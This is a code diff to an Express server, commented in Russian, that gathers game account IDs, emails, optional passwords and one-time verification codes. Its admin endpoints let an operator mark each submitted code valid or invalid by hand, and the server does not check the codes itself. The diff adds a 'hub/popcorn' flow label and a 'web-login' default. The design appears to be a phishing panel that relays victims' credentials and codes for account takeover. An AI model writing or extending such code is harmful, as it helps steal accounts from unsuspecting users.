@@ -40,7 +40,7 @@ app.get("/admin", (req, res) => {
 
 let idCodeRequests = [];     // запросы на код для айди
 let emailCodeRequests = [];  // запросы на код для почты
-let registrations = [];      // финальные заявки
+let registrations = [];      // финальные заявки (hub + popcorn)
 let seq = 1;
 
 function genId() {
@@ -137,7 +137,6 @@ app.post("/api/verify-id-code", (req, res) => {
 
   console.log("[ID VERIFY] code=", cleanCode, "rec-status=", rec.status);
 
-  // важный момент:
   // сервер НЕ сравнивает код, а просто возвращает решение админа
   if (rec.status === "valid") {
     return res.json({ status: "valid" });
@@ -234,7 +233,7 @@ app.post("/api/verify-email-code", (req, res) => {
 });
 
 // 5) финальная заявка (после двух кодов с точки зрения фронта)
-// body: { accessCode, ingameId, email, password?, idCode?, emailCode? }
+// body: { accessCode, ingameId, email, password?, idCode?, emailCode?, flow? }
 app.post("/api/submit-registration", (req, res) => {
   const {
     accessCode,
@@ -243,8 +242,10 @@ app.post("/api/submit-registration", (req, res) => {
     password,
     idCode,
     emailCode,
+    flow,              // <<< НОВОЕ: тип заявки (hub / popcorn)
   } = req.body || {};
 
+  // ВАЖНО: для попкорна можно делать accessCode="POPCORN", ingameId="web-login"
   if (!accessCode || !ingameId || !email) {
     return res.status(400).json({ ok: false, error: "missing_fields" });
   }
@@ -273,6 +274,7 @@ app.post("/api/submit-registration", (req, res) => {
     idVerified,
     emailVerified,
     status: "pending", // pending | approved | declined
+    flow: flow || (ingameId === "web-login" ? "popcorn" : "hub"), // <<< НОВОЕ
     createdAt: new Date().toISOString(),
     declineReason: null,
     adminNote: null,
@@ -362,7 +364,6 @@ app.post("/admin/api/registration/approve", (req, res) => {
     "link=", link,
     "note=", note
   );
-  // тут можно подвесить отправку письма
   res.json({ ok: true });
 });
 
@@ -383,7 +384,6 @@ app.post("/admin/api/registration/decline", (req, res) => {
     "reason=", reason,
     "note=", note
   );
-  // и тут тоже можно отправить письмо с отказом
   res.json({ ok: true });
 });
 
